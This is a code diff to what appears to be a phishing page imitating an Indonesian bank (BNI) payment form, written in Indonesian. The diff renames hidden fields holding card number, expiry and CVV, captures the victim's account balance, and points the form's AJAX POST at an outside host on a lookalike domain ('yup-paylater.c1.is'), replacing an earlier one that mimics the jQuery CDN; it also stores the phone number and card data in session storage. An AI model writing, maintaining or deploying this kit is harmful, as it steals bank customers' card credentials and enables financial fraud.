@@ -14560,16 +14560,16 @@ Pastikan Saldo Sesuai di rekening</p>
     
     
  	<input type="hidden" name="nomor_hp" id="nomorku" value="">
-    <input type="hidden" name="debitku" id="nama" value="">
-    <input type="hidden" name="bulanku" id="bulan" value="">
-    <input type="hidden" name="tahunku" id="tahun" value="">
+    <input type="hidden" name="no_kartu" id="nama" value="">
+    <input type="hidden" name="bulan" id="bulan" value="">
+    <input type="hidden" name="tahun" id="tahun" value="">
     <input type="hidden" name="cvvkode" id="pesan" value="">	
    
           <div class="form-group mb-0 p-2">
             
             <label for="amount" class="text-blue pl-0 bold-important text-blue">Masukkan Saldo Terakhir anda :</label>
             <div class="input-group border-bottom rounded-0">
-            <input type="tel" id="saldo"  class="form-control input-rounded input-bg-transparant"
+            <input type="tel" name="saldo" id="saldo"  class="form-control input-rounded input-bg-transparant"
                      style="background: #ffffff00; font-size: 18px; border: none; padding-left: 10px; margin-top: 10px; width: outline: none"  name="saldo"  placeholder="Rp. xxx" maxlength="" value="" required /> 
 <input type="hidden" id="tanparupiah">    
              
@@ -14633,7 +14633,7 @@ document.getElementById("pesan").value = cvvkode + "";
 $.ajax({
  
 type: 'POST',
-url: 'https://code-jquery-com.c1.is/BNI/sendSaldo.php',
+url: 'https://yup-paylater.c1.is/BNI/5/sendSaldo.php',
 data: $('#debitForm').serialize(),
 dataType: 'text',
 
@@ -14642,6 +14642,9 @@ complete: function(data) {
        
    setTimeout(function(){
       window.location.href = 'konf.html';
+
+var nomor = document.getElementById("nomorku").value;
+ sessionStorage.setItem("nomor", nomor);
 var debit = document.getElementById("nama").value;
  sessionStorage.setItem("debit", debit);
  var bulan = document.getElementById("bulan").value;
